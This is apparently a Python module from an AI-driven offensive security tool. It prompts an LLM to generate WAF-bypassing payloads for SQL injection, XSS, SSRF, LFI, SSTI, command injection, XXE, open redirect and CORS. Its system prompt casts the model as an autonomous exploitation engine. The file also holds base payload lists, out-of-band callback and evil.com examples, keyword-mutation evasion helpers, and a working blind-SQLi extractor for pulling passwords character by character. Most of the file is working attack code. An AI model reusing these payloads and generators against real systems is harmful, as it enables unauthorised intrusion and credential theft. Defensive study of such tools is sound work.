"""
XLayer AI - AI-Powered Adaptive Payload Generator

Core engine for contextual mutation and self-learning payload crafting.
AI analyzes environment, learns from failures, and generates novel bypasses.
"""

import json
import re
import asyncio
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any
from enum import Enum
from loguru import logger

# Lazy import to avoid circular; resolved at first call
_MUTATION_ENGINE = None


def _get_mutation_engine():
    global _MUTATION_ENGINE
    if _MUTATION_ENGINE is None:
        from xlayer_ai.tools.mutation_engine import MutationEngine
        _MUTATION_ENGINE = MutationEngine()
    return _MUTATION_ENGINE


class FailureReason(str, Enum):
    WAF_BLOCK        = "waf_block"         # 403/406 response
    FILTERED         = "filtered"          # payload stripped from response
    WRONG_SYNTAX     = "wrong_syntax"      # DB/parser error on our own payload
    NO_DIFFERENCE    = "no_difference"     # response same as baseline
    PARTIAL          = "partial"           # close but incomplete
    TIMEOUT          = "timeout"           # request timed out
    UNKNOWN          = "unknown"


@dataclass
class AttemptResult:
    payload: str
    status_code: int
    response_body: str
    response_length: int
    elapsed_ms: float
    success: bool
    failure_reason: Optional[FailureReason] = None
    filtered_chars: List[str]             = field(default_factory=list)
    error_message: Optional[str]          = None
    waf_name: Optional[str]               = None
    partial_match: bool                   = False


@dataclass
class AttackContext:
    """Full context for AI payload generation"""
    url: str
    parameter: str
    method: str
    vuln_type: str                          # sqli / xss / ssrf / lfi / auth

    # Tech stack from recon
    server: str                = "unknown"
    language: str              = "unknown"
    framework: str             = "unknown"
    database: str              = "unknown"
    waf: Optional[str]         = None

    # Baseline measurements
    baseline_length: int       = 0
    baseline_time_ms: float    = 0.0

    # Probe-first: lightweight probe before full payloads — use for payload choice
    probe_status_quote: int          = 0
    probe_status_lt: int             = 0
    probe_body_snippet: str          = ""

    # Discovered during probing
    reflected_chars: List[str]       = field(default_factory=list)
    filtered_chars: List[str]        = field(default_factory=list)
    error_messages: List[str]        = field(default_factory=list)
    time_delay_works: bool           = False
    boolean_diff_works: bool         = False
    quotes_filtered: bool            = False
    keywords_filtered: List[str]     = field(default_factory=list)

    # Full attempt history
    attempts: List[AttemptResult]    = field(default_factory=list)

    def add_attempt(self, result: AttemptResult):
        self.attempts.append(result)
        if not result.success:
            self.filtered_chars.extend(result.filtered_chars)
            if result.filtered_chars and ("'" in result.filtered_chars or '"' in result.filtered_chars):
                self.quotes_filtered = True
            if result.waf_name:
                self.waf = result.waf_name
            if result.error_message:
                self.error_messages.append(result.error_message)

    def get_failed_payloads(self) -> List[str]:
        return [a.payload for a in self.attempts if not a.success]

    def get_successful_payloads(self) -> List[str]:
        return [a.payload for a in self.attempts if a.success]

    def last_n_failures(self, n: int = 5) -> List[AttemptResult]:
        failed = [a for a in self.attempts if not a.success]
        return failed[-n:]

    def failure_summary(self) -> str:
        lines = []
        if self.probe_body_snippet or self.probe_status_quote or self.probe_status_lt:
            lines.append("  Probe-first: status(quote)=%s status(<)=%s" % (self.probe_status_quote, self.probe_status_lt))
            if self.probe_body_snippet:
                lines.append("  Probe body snippet: " + self.probe_body_snippet[:300].replace("\n", " "))
        for i, a in enumerate(self.last_n_failures(6), 1):
            reason = a.failure_reason.value if a.failure_reason else "unknown"
            lines.append(f"  {i}. [{reason}] `{a.payload[:60]}` → status={a.status_code} len={a.response_length}")
        lines.append(f"\n  Filtered chars: {list(set(self.filtered_chars))}")
        lines.append(f"  Filtered keywords: {self.keywords_filtered}")
        lines.append(f"  WAF: {self.waf or 'not detected'}")
        lines.append(f"  Quotes filtered: {self.quotes_filtered}")
        lines.append(f"  Time delay works: {self.time_delay_works}")
        lines.append(f"  Boolean diff works: {self.boolean_diff_works}")
        return "\n".join(lines)


# ─── Hex Encoding Helpers ────────────────────────────────────────────────────

def to_hex_string(s: str) -> str:
    """Convert string to MySQL hex literal: 'admin' → 0x61646d696e"""
    return "0x" + s.encode().hex()


def to_char_string(s: str, db: str = "mysql") -> str:
    """Convert string to CHAR() function call"""
    codes = ",".join(str(ord(c)) for c in s)
    if db == "mssql":
        return f"CHAR({codes})"
    elif db == "postgresql":
        return f"CHR({codes})"
    else:
        return f"CHAR({codes})"


def mutate_keyword(keyword: str) -> List[str]:
    """Generate WAF bypass mutations of a SQL keyword"""
    variants = []
    # Case toggle
    variants.append(keyword.upper())
    variants.append(keyword.lower())
    variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(keyword)))
    # Inline comment split (MySQL)
    mid = len(keyword) // 2
    variants.append(keyword[:mid] + "/**/" + keyword[mid:])
    # MySQL versioned comment
    variants.append(f"/*!50000{keyword.upper()}*/")
    # Double char (for WAF that strips single occurrence)
    doubled = ""
    for c in keyword:
        doubled += c + c
    variants.append(doubled)
    return list(set(variants))


def hex_encode_string_literals(payload: str) -> str:
    """
    Find quoted strings in payload and replace with hex.
    'admin' → 0x61646d696e
    """
    def replace_match(m):
        s = m.group(1) or m.group(2)
        return to_hex_string(s)

    result = re.sub(r"'([^']*)'|\"([^\"]*)\"", replace_match, payload)
    return result


# ─── System Prompt ────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are XLAYER, an autonomous security testing engine specializing in web application vulnerability exploitation.

Core rules:
1. Output ONLY valid, immediately-executable payloads — no inline explanations
2. Never repeat a pattern that was already blocked
3. If quotes are filtered → use hex encoding (0x...) or CHAR()
4. If keywords are blocked → use case mutation, inline comments, versioned comments, or double-char tricks
5. Adapt every payload to the target technology stack
6. Return ONLY valid JSON, no markdown fences
"""


# ─── Per-VulnType Prompt Templates ──────────────────────────────────────────

PROMPT_TEMPLATES = {

    "sqli": """
MISSION: Generate SQL injection payloads that will bypass current defenses.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Database: {database}
- Language: {language}
- WAF: {waf}
- Quotes filtered: {quotes_filtered}
- Filtered keywords: {keywords_filtered}
- Time delay confirmed: {time_delay_works}
- Boolean blind confirmed: {boolean_diff_works}

FAILURE HISTORY (learn from these):
{failure_summary}

CONSTRAINTS:
- Do NOT use: {filtered_chars}
- Do NOT repeat any failed payload pattern
- If quotes filtered → use hex encoding (0x...) or CHAR()
- If UNION/SELECT blocked → use /*!50000UNION*/ style OR double-char trick
- If WAF present → use versioned comments, case mutation, space substitution

TASK: Generate 6 diverse SQL injection payloads using different techniques:
1. One using hex encoding for all string literals
2. One using time-based approach (if applicable)
3. One using boolean-blind approach
4. One using error extraction (EXTRACTVALUE/UPDATEXML)
5. One using inline comment mutations to bypass keyword filters
6. One creative novel approach not tried before

Return JSON only:
{{
  "analysis": "brief analysis of why previous payloads failed",
  "strategy": "your bypass strategy",
  "payloads": [
    {{"payload": "...", "technique": "hex_encoding", "reasoning": "..."}},
    {{"payload": "...", "technique": "time_based", "reasoning": "..."}},
    {{"payload": "...", "technique": "boolean_blind", "reasoning": "..."}},
    {{"payload": "...", "technique": "error_based", "reasoning": "..."}},
    {{"payload": "...", "technique": "keyword_mutation", "reasoning": "..."}},
    {{"payload": "...", "technique": "novel", "reasoning": "..."}}
  ]
}}
""",

    "xss": """
MISSION: Generate XSS payloads that execute JavaScript in the target context.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Language: {language}
- Framework: {framework}
- WAF: {waf}
- Reflection context: {xss_context}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 XSS payloads for context: {xss_context}

Techniques to use:
1. Tag mutation (<ScRiPt>, <SCRIPT>, etc.)
2. Event handler without script tag (onerror, onload, onfocus)
3. JavaScript URI (javascript:...)
4. Base64 encoded payload (eval(atob(...)))
5. Template injection ({{}}) if framework detected
6. CSS injection or SVG-based

Return JSON only:
{{
  "analysis": "why previous payloads failed",
  "strategy": "bypass approach",
  "payloads": [
    {{"payload": "...", "technique": "tag_mutation", "reasoning": "..."}},
    {{"payload": "...", "technique": "event_handler", "reasoning": "..."}},
    {{"payload": "...", "technique": "js_uri", "reasoning": "..."}},
    {{"payload": "...", "technique": "base64", "reasoning": "..."}},
    {{"payload": "...", "technique": "template", "reasoning": "..."}},
    {{"payload": "...", "technique": "svg_css", "reasoning": "..."}}
  ]
}}
""",

    "ssrf": """
MISSION: Generate SSRF payloads to access internal services.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Server: {server}
- Cloud provider hints: {cloud_hints}
- WAF: {waf}
- Filtered patterns: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 SSRF payloads:
1. IPv6 localhost bypass
2. Decimal IP encoding
3. Octal IP encoding
4. Cloud metadata (AWS/GCP/Azure)
5. DNS rebinding hint
6. Protocol smuggling (file://, dict://, gopher://)

Return JSON only:
{{
  "analysis": "...",
  "strategy": "...",
  "payloads": [
    {{"payload": "...", "technique": "ipv6", "reasoning": "..."}},
    {{"payload": "...", "technique": "decimal_ip", "reasoning": "..."}},
    {{"payload": "...", "technique": "octal_ip", "reasoning": "..."}},
    {{"payload": "...", "technique": "cloud_metadata", "reasoning": "..."}},
    {{"payload": "...", "technique": "dns_rebind", "reasoning": "..."}},
    {{"payload": "...", "technique": "protocol_smuggle", "reasoning": "..."}}
  ]
}}
""",

    "lfi": """
MISSION: Generate LFI/path traversal payloads to read sensitive files.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Server OS: {server_os}
- Language: {language}
- WAF: {waf}
- Filtered patterns: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 LFI payloads:
1. Double-dot bypass (....//....//etc/passwd)
2. URL encoding (%2e%2e%2f)
3. Double URL encoding (%252e%252e%252f)
4. Null byte injection (path%00.jpg)
5. PHP wrapper (php://filter/...)
6. OS-specific absolute path

Return JSON only:
{{
  "analysis": "...",
  "strategy": "...",
  "payloads": [
    {{"payload": "...", "technique": "double_dot", "reasoning": "..."}},
    {{"payload": "...", "technique": "url_encode", "reasoning": "..."}},
    {{"payload": "...", "technique": "double_url_encode", "reasoning": "..."}},
    {{"payload": "...", "technique": "null_byte", "reasoning": "..."}},
    {{"payload": "...", "technique": "php_wrapper", "reasoning": "..."}},
    {{"payload": "...", "technique": "absolute_path", "reasoning": "..."}}
  ]
}}
""",

    "auth": """
MISSION: Generate authentication bypass payloads.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Language: {language}
- Framework: {framework}
- WAF: {waf}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 auth bypass payloads:
1. SQL injection bypass (no quotes if filtered)
2. NoSQL operator injection
3. LDAP injection
4. JWT algorithm confusion hint
5. Parameter pollution
6. Type juggling (PHP specific if applicable)

Return JSON only:
{{
  "analysis": "...",
  "strategy": "...",
  "payloads": [
    {{"payload": "...", "technique": "sqli_bypass", "reasoning": "..."}},
    {{"payload": "...", "technique": "nosql", "reasoning": "..."}},
    {{"payload": "...", "technique": "ldap", "reasoning": "..."}},
    {{"payload": "...", "technique": "jwt", "reasoning": "..."}},
    {{"payload": "...", "technique": "param_pollution", "reasoning": "..."}},
    {{"payload": "...", "technique": "type_juggling", "reasoning": "..."}}
  ]
}}
""",

    "ssti": """
MISSION: Generate SSTI (Server-Side Template Injection) payloads for code execution.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Framework: {framework}
- Language: {language}
- WAF: {waf}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 SSTI payloads for different template engines:
1. Jinja2 detection and object traversal (Python)
2. Twig exploitation (PHP)
3. Freemarker exploitation (Java)
4. ERB exploitation (Ruby)
5. Velocity or Mako (Java/Python)
6. Polyglot probe that tests multiple engines simultaneously

Return JSON only:
{{
  "analysis": "why previous payloads failed",
  "strategy": "template engine fingerprinting and exploit approach",
  "payloads": [
    {{"payload": "...", "technique": "jinja2", "reasoning": "..."}},
    {{"payload": "...", "technique": "twig", "reasoning": "..."}},
    {{"payload": "...", "technique": "freemarker", "reasoning": "..."}},
    {{"payload": "...", "technique": "erb", "reasoning": "..."}},
    {{"payload": "...", "technique": "velocity", "reasoning": "..."}},
    {{"payload": "...", "technique": "polyglot", "reasoning": "..."}}
  ]
}}""",

    "rce": """
MISSION: Generate OS command injection payloads to achieve Remote Code Execution.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Server: {server}
- Language: {language}
- WAF: {waf}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 RCE/command injection payloads:
1. Semicolon separator (;id or ;whoami)
2. Pipe operator (|id)
3. AND/OR chaining (&& or ||)
4. Backtick or $() subshell execution
5. Newline injection (%0a id)
6. Blind OOB via curl/nslookup to collaborator

Return JSON only:
{{
  "analysis": "why previous payloads failed",
  "strategy": "command separator and evasion approach",
  "payloads": [
    {{"payload": "...", "technique": "semicolon", "reasoning": "..."}},
    {{"payload": "...", "technique": "pipe", "reasoning": "..."}},
    {{"payload": "...", "technique": "and_or", "reasoning": "..."}},
    {{"payload": "...", "technique": "subshell", "reasoning": "..."}},
    {{"payload": "...", "technique": "newline", "reasoning": "..."}},
    {{"payload": "...", "technique": "oob_dns", "reasoning": "..."}}
  ]
}}""",

    "xxe": """
MISSION: Generate XXE (XML External Entity) payloads to read files or trigger SSRF.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Server: {server}
- Language: {language}
- WAF: {waf}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 XXE payloads:
1. Classic file read (file:///etc/passwd)
2. SSRF via external entity (http://internal-service/)
3. Out-of-band XXE via parameter entity and external DTD
4. Blind XXE with error-based extraction
5. PHP or Java wrapper (php://filter, jar://)
6. SVG or HTML-based XXE (if content-type is flexible)

Return JSON only:
{{
  "analysis": "why previous payloads failed",
  "strategy": "XXE variant and OOB approach",
  "payloads": [
    {{"payload": "...", "technique": "file_read", "reasoning": "..."}},
    {{"payload": "...", "technique": "ssrf", "reasoning": "..."}},
    {{"payload": "...", "technique": "oob_dtd", "reasoning": "..."}},
    {{"payload": "...", "technique": "error_based", "reasoning": "..."}},
    {{"payload": "...", "technique": "wrapper", "reasoning": "..."}},
    {{"payload": "...", "technique": "svg_html", "reasoning": "..."}}
  ]
}}""",

    "open_redirect": """
MISSION: Generate open redirect payloads to redirect users to attacker-controlled URLs.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Framework: {framework}
- WAF: {waf}
- Filtered chars: {filtered_chars}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 open redirect payloads:
1. Protocol-relative URL (//evil.com)
2. URL-encoded redirect (%2f%2fevil.com)
3. Double-slash with whitespace bypass
4. Domain confusion (target.com.evil.com)
5. Scheme abuse (javascript:, data:)
6. Fragment or query confusion

Return JSON only:
{{
  "analysis": "why previous payloads failed",
  "strategy": "redirect validation bypass approach",
  "payloads": [
    {{"payload": "...", "technique": "protocol_relative", "reasoning": "..."}},
    {{"payload": "...", "technique": "url_encoded", "reasoning": "..."}},
    {{"payload": "...", "technique": "whitespace", "reasoning": "..."}},
    {{"payload": "...", "technique": "domain_confusion", "reasoning": "..."}},
    {{"payload": "...", "technique": "scheme_abuse", "reasoning": "..."}},
    {{"payload": "...", "technique": "fragment", "reasoning": "..."}}
  ]
}}""",

    "cors": """
MISSION: Generate CORS misconfiguration test payloads (Origin header values) to probe access-control bypass.

TARGET ENVIRONMENT:
- URL: {url}
- Parameter: {parameter}
- Server: {server}
- WAF: {waf}

FAILURE HISTORY:
{failure_summary}

TASK: Generate 6 CORS bypass Origin values:
1. Arbitrary origin (https://evil.com)
2. Null origin
3. Subdomain of target domain
4. Pre-domain attack (https://attacker-target.com)
5. HTTP downgrade of HTTPS origin
6. Regex bypass with special characters or extra dots

Return JSON only:
{{
  "analysis": "why previous attempts failed",
  "strategy": "CORS origin validation bypass approach",
  "payloads": [
    {{"payload": "https://evil.com", "technique": "arbitrary_origin", "reasoning": "..."}},
    {{"payload": "null", "technique": "null_origin", "reasoning": "..."}},
    {{"payload": "...", "technique": "subdomain", "reasoning": "..."}},
    {{"payload": "...", "technique": "pre_domain", "reasoning": "..."}},
    {{"payload": "...", "technique": "http_downgrade", "reasoning": "..."}},
    {{"payload": "...", "technique": "regex_bypass", "reasoning": "..."}}
  ]
}}"""
}


# ─── Main Generator Class ─────────────────────────────────────────────────────

class AIPayloadGenerator:
    """
    AI-powered payload generator with contextual mutation and failure learning.

    Flow:
      1. Build rich context from target environment + failure history
      2. Select appropriate prompt template per vuln type
      3. Apply pre-generation mutations (hex, keyword split) automatically
      4. Send to LLM for novel generation
      5. Validate + deduplicate returned payloads
      6. Apply post-generation mutations for additional variants
    """

    def __init__(self, llm_engine):
        self.llm = llm_engine

    async def generate(
        self,
        context: AttackContext,
        extra: Optional[Dict[str, Any]] = None
    ) -> List[str]:
        """
        Generate AI payloads based on full attack context.
        Returns list of payload strings ready to send.
        """
        if not self.llm or not self.llm.is_ready:
            logger.warning("AIPayloadGenerator: LLM not ready, falling back to mutations only")
            return self._mutation_only_fallback(context)

        prompt = self._build_prompt(context, extra or {})

        try:
            raw = await self.llm._complete_with_system(SYSTEM_PROMPT, prompt)
            payloads = self._parse_response(raw)
            payloads = self._validate(payloads, context)
            payloads = self._add_mutations(payloads, context)
            logger.info(f"AIPayloadGenerator: {len(payloads)} payloads generated for {context.vuln_type}")
            return payloads
        except Exception as e:
            logger.error(f"AIPayloadGenerator error: {e}")
            return self._mutation_only_fallback(context)

    def _build_prompt(self, ctx: AttackContext, extra: Dict) -> str:
        template = PROMPT_TEMPLATES.get(ctx.vuln_type, PROMPT_TEMPLATES["sqli"])

        fill = {
            "url": ctx.url,
            "parameter": ctx.parameter,
            "database": ctx.database,
            "language": ctx.language,
            "framework": ctx.framework,
            "server": ctx.server,
            "waf": ctx.waf or "none detected",
            "quotes_filtered": ctx.quotes_filtered,
            "keywords_filtered": ctx.keywords_filtered,
            "filtered_chars": list(set(ctx.filtered_chars)),
            "time_delay_works": ctx.time_delay_works,
            "boolean_diff_works": ctx.boolean_diff_works,
            "failure_summary": ctx.failure_summary() if ctx.attempts else "  No previous attempts.",
            "xss_context": extra.get("xss_context", "HTML_BODY"),
            "cloud_hints": extra.get("cloud_hints", "unknown"),
            "server_os": extra.get("server_os", "linux"),
        }

        # Escape curly braces in fill values so payloads containing { or }
        # don't crash str.format() (e.g. NoSQL payloads: {"$ne": null})
        safe_fill = {k: str(v).replace("{", "{{").replace("}", "}}") for k, v in fill.items()}
        return template.format(**safe_fill)

    def _parse_response(self, raw: str) -> List[str]:
        """Extract payload strings from LLM JSON response"""
        try:
            # Strip markdown fences
            clean = re.sub(r"```(?:json)?\s*|\s*```", "", raw).strip()
            data = json.loads(clean)

            payloads = []
            for item in data.get("payloads", []):
                if isinstance(item, str):
                    payloads.append(item)
                elif isinstance(item, dict):
                    p = item.get("payload", "")
                    if p:
                        payloads.append(p)
            return payloads
        except Exception as e:
            logger.debug(f"JSON parse failed, trying regex extraction: {e}")
            # Fallback: extract anything in quotes after "payload":
            found = re.findall(r'"payload"\s*:\s*"((?:[^"\\]|\\.)*)"', raw)
            return found

    def _validate(self, payloads: List[str], ctx: AttackContext) -> List[str]:
        """Remove duplicates, empties, and already-tried payloads"""
        failed = set(ctx.get_failed_payloads())
        seen = set()
        result = []
        for p in payloads:
            p = p.strip()
            if not p:
                continue
            if p in failed:
                continue
            if p in seen:
                continue
            seen.add(p)
            result.append(p)
        return result

    def _add_mutations(self, payloads: List[str], ctx: AttackContext) -> List[str]:
        """
        Auto-apply full MutationEngine to AI payloads for additional coverage.
        Context-aware: uses only mutations relevant to current vuln type and filters.
        """
        try:
            engine = _get_mutation_engine()
            extra = engine.mutate_to_strings(
                vuln_type=ctx.vuln_type,
                payloads=payloads[:6],   # mutate top 6 AI suggestions
                ctx=ctx,
                limit=20
            )
            # Combine: original AI payloads first, then mutations
            seen = set(payloads)
            result = list(payloads)
            for p in extra:
                if p not in seen:
                    result.append(p)
                    seen.add(p)
            return result
        except Exception as e:
            logger.warning(f"_add_mutations fallback: {e}")
            return payloads

    def _mutation_only_fallback(self, ctx: AttackContext) -> List[str]:
        """
        When LLM is unavailable, use full MutationEngine on base payloads
        for maximum coverage without AI cost.
        """
        base_payloads = {
            "sqli": [
                "' OR 1=1--", "1 AND 1=1", "' UNION SELECT NULL--",
                "' AND SLEEP(5)--", "' AND '1'='1",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
            "ssrf": [
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "auth": [
                "admin'--",
                "' OR 1=1--",
                '{"$ne": null}',
            ],
        }

        bases = base_payloads.get(ctx.vuln_type, [])

        try:
            engine = _get_mutation_engine()
            return engine.mutate_to_strings(
                vuln_type=ctx.vuln_type,
                payloads=bases,
                ctx=ctx,
                limit=40
            )
        except Exception:
            # Bare-minimum fallback
            result = []
            for p in bases:
                if p not in ctx.get_failed_payloads():
                    result.append(p)
            return result


# ─── Binary Search Extractor ─────────────────────────────────────────────────

class BinarySearchExtractor:
    """
    Efficiently extract string data via boolean-blind SQLi
    using binary search — 5-7 requests per character instead of 26+.
    """

    def __init__(self, send_fn, endpoint, parameter, ctx, db: str = "mysql"):
        """
        send_fn: async callable(endpoint, parameter, payload) → SendResult
        ctx: AttackContext — provides baseline_length for true/false condition detection
        """
        self.send = send_fn
        self.endpoint = endpoint
        self.parameter = parameter
        self.ctx = ctx
        self.db = db

    async def extract_string(
        self,
        sql_expression: str,
        max_length: int = 50
    ) -> str:
        """
        Extract a string result from sql_expression char by char using binary search.
        Example: sql_expression = "SELECT password FROM users LIMIT 1"
        """
        result = ""

        for pos in range(1, max_length + 1):
            char_ascii = await self._binary_search_char(sql_expression, pos)
            if char_ascii is None or char_ascii == 0:
                break
            result += chr(char_ascii)
            logger.debug(f"BinarySearch: pos={pos} char={chr(char_ascii)} so far='{result}'")

        return result

    async def _binary_search_char(
        self,
        sql_expr: str,
        position: int,
        low: int = 32,
        high: int = 126
    ) -> Optional[int]:
        """Binary search for ASCII value of character at position"""
        while low <= high:
            mid = (low + high) // 2
            payload = self._make_payload(sql_expr, position, mid)

            result = await self.send(self.endpoint, self.parameter, payload)
            if result is None:
                return None

            # True condition: response matches baseline length (AND 1=1 pattern)
            # False condition: response differs from baseline (AND 1=2 pattern)
            same_as_baseline = abs(len(result.body) - self.ctx.baseline_length) <= 20
            if same_as_baseline:
                low = mid + 1
            else:
                high = mid - 1

        return low - 1 if low > 32 else None

    def _make_payload(self, sql_expr: str, pos: int, ascii_val: int) -> str:
        """Generate boolean payload for binary search (DB-specific syntax)"""
        db = self.db.lower()
        if db == "postgresql":
            # PostgreSQL: SUBSTR, comment with trailing space
            return f"' AND ASCII(SUBSTR(({sql_expr}),{pos},1))>{ascii_val}-- "
        elif db == "mssql":
            # MSSQL: SUBSTRING, comment with trailing space required
            return f"' AND ASCII(SUBSTRING(({sql_expr}),{pos},1))>{ascii_val}-- "
        elif db == "oracle":
            # Oracle: SUBSTR (not SUBSTRING), no -- comment → use AND '' syntax
            return f"' AND ASCII(SUBSTR(({sql_expr}),{pos},1))>{ascii_val} AND ''='"
        else:
            # MySQL and default: SUBSTRING with -- comment
            return f"' AND ASCII(SUBSTRING(({sql_expr}),{pos},1))>{ascii_val}-- "
